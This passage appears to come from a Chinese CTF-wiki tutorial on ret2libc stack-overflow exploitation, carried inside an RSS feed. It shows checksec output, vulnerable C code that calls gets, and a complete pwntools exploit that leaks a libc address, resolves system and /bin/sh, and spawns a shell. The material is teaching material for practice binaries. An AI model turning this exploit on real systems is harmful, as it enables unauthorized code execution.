sh.interactive()&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。&lt;/p&gt;
&lt;h4 id=&#34;例-3¶&#34;&gt;&lt;a href=&#34;#例-3¶&#34; class=&#34;headerlink&#34; title=&#34;例 3¶&#34;&gt;&lt;/a&gt;例 3&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzM=&#34;&gt;¶&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;这里以 bamboofox 中的 ret2libc3 为例&lt;/p&gt;
&lt;p&gt;点击下载: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMzL3JldDJsaWJjMw==&#34;&gt;ret2libc3&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;➜  ret2libc3 checksec ret2libc3
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&#34;No surprise anymore, system disappeard QQ.&#34;);
  printf(&#34;Can you find it !?&#34;);
  gets((char *)&amp;amp;v4);
  return 0;
}&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。&lt;/li&gt;
&lt;li&gt;即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL25pa2xhc2IvbGliYy1kYXRhYmFzZQ==&#34;&gt;https://github.com/niklasb/libc-database&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。&lt;/p&gt;
&lt;p&gt;那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。&lt;strong&gt;当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpZWFudS9MaWJjU2VhcmNoZXI=&#34;&gt;https://github.com/lieanu/LibcSearcher&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。&lt;/p&gt;
&lt;p&gt;这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;泄露 __libc_start_main 地址&lt;/li&gt;
&lt;li&gt;获取 libc 版本&lt;/li&gt;
&lt;li&gt;获取 system 地址与 /bin/sh 的地址&lt;/li&gt;
&lt;li&gt;再次执行源程序&lt;/li&gt;
&lt;li&gt;触发栈溢出执行 system(‘/bin/sh’)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;exp 如下&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process(&#39;./ret2libc3&#39;)

ret2libc3 = ELF(&#39;./ret2libc3&#39;)

puts_plt = ret2libc3.plt[&#39;puts&#39;]
libc_start_main_got = ret2libc3.got[&#39;__libc_start_main&#39;]
main = ret2libc3.symbols[&#39;main&#39;]

print &#34;leak libc_start_main_got addr and return to main again&#34;
payload = flat([&#39;A&#39; * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter(&#39;Can you find it !?&#39;, payload)

print &#34;get the related addr&#34;
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher(&#39;__libc_start_main&#39;, libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;)
system_addr = libcbase + libc.dump(&#39;system&#39;)
binsh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)

print &#34;get shell&#34;
payload = flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;题目-¶-2&#34;&gt;&lt;a href=&#34;#题目-¶-2&#34; class=&#34;headerlink&#34; title=&#34;题目 ¶&#34;&gt;&lt;/a&gt;题目 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18xMQ==&#34;&gt;¶&lt;/span&gt;&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;train.cs.nctu.edu.tw: ret2libc&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
    </channel>
</rss>
